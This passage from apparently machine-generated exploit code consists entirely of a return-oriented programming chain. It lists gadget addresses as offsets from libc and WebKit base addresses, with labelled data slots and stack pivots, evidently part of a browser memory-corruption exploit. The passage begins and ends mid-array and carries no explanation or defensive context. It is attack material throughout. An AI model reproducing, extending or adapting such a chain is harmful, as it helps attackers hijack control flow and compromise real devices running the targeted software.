libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+84424, //L470
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84456, //L473
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84440, //L471
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+84408, //L472
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L471:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+84576, //L475
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84592, //L476
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+84560, //L474
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+84680, //L478
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L478:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84736, //L479
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L479:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84808, //L482
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84864, //L484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L484:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L485:
libc_base+793877, //pop rsi
ropchain+84952, //L486
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L486:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L487:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85056, //L489
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85072, //L490
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L489:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L490:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+85224, //L492
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85256, //L495
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85240, //L493
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+85208, //L494
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L493:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+85352, //L497
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+85336, //L496
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+85440, //L499
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85496, //L500
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L500:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L501:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+85576, //L504
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L504:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+73968, //L202
//L235:
libc_base+793877, //pop rsi
ropchain+85672, //L505
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L505:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L506:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85776, //L508
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85792, //L509
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L508:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+85912, //L512
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85928, //L513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+85896, //L511
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86024, //L514
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86040, //L515
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86152, //L516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86136, //L517
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+86240, //L519
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+86224, //L518
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86336, //L520
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86352, //L521
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86464, //L522
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86448, //L523
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86536, //L524
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L524:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86600, //L526
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L526:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L529:
db([32, 0]); // 0x20
set_gadget(libc_base+792472,); //pop rcx
//L530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+86752, //L531
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86768, //L532
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L531:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L532:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+86872, //L535
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+86856, //L534
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L534:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L535:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L536:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L538:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87016, //L540
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87032, //L541
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L540:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L541:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87176, //L545
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87144, //L543
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87160, //L544
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+87248, //L547
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L547:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87304, //L548
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L548:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87384, //L552
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L552:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L550:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L551:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+87488, //L553
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+87504, //L554
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+87592, //L556
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87648, //L557
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L557:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87752, //L559
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L559:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L560:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87856, //L562
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87872, //L563
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L562:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L563:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88016, //L567
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87984, //L565
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88000, //L566
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88088, //L569
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L569:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88144, //L570
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L570:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88224, //L574
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L574:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L572:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L573:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+88328, //L575
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+88344, //L576
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+88432, //L578
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L578:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88488, //L579
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L579:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88560, //L582
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L582:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88616, //L584
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L584:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L585:
pivot_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88752, //L586
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L586:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L587:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+88856, //L589
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88872, //L590
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L589:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89016, //L594
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88984, //L592
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89000, //L593
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89088, //L596
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+89144, //L597
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L597:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89224, //L601
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L601:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L599:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L600:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+89328, //L602
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+89344, //L603
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+89432, //L605
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89488, //L606
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L606:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89560, //L609
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L609:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89616, //L611
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L611:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89704, //L612
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L612:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L613:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+89808, //L615
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89824, //L616
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L615:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L616:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89968, //L620
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89936, //L618
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89952, //L619
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90040, //L622
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L622:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90096, //L623
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L623:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90176, //L627
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L627:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L625:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L626:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+90280, //L628
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+90296, //L629
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+90384, //L631
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L631:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90440, //L632
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L632:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90544, //L634
